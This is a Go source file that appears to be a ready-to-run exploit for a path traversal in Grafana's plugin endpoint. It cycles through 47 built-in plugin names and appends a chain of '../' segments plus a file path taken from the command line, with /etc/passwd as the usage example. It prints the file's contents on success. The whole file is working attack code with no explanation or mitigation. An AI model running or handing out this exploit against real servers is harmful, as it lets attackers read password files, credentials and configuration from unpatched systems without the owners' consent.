package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
)


func sendHttp(url string) string{
	fmt.Println("[*]Url: ",url)
	method := "GET"

	client := &http.Client {
	}
	req, err := http.NewRequest(method, url, nil)

	if err != nil {
		fmt.Println("[-]",err)
		return "0"
	}

	res, err := client.Do(req)
	if err != nil {
		fmt.Println("[-]",err)
		return "0"
	}
	if res.StatusCode != 200{
		fmt.Println("[-]Exploit failed")
		return "1"
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println("[-]",err)
		return "0"
	}
	return string(body)
}

func main() {

	pluginID := [47]string{"cloudwatch","dashboard","elasticsearch","grafana","grafana-azure-monitor-datasource","graphite","influxdb","jaeger","loki","mixed","mssql","mysql","opentsdb","postgres","prometheus","tempo","testdata","zipkin","alertGroups","alertlist","annolist","barchart","bargauge","canvas","dashlist","debug","gauge","geomap","gettingstarted","graph","heatmap","histogram","live","logs","news","nodeGraph","piechart","pluginlist","stat","state-timeline","status-history","table","table-old","text","timeseries","welcome","xychart"}

	if len(os.Args) != 3{
		fmt.Println("[!]usage: exp http://example.com /etc/passwd")
		return
	}
	host := os.Args[1]
	path := "/public/plugins/"
	file := os.Args[2]
	fmt.Println("[*]Start test...")
	for i := 0; i <= 46; i++{
		url := host + path + pluginID[i] + "/../../../../../../../../../../../.." + file
		res := sendHttp(url)
		if res == "0"{
			return
		}
		if res == "1"{
			continue
		}
		fmt.Println("[+]Exploit successfully!")
		fmt.Println(res)
		return
	}

}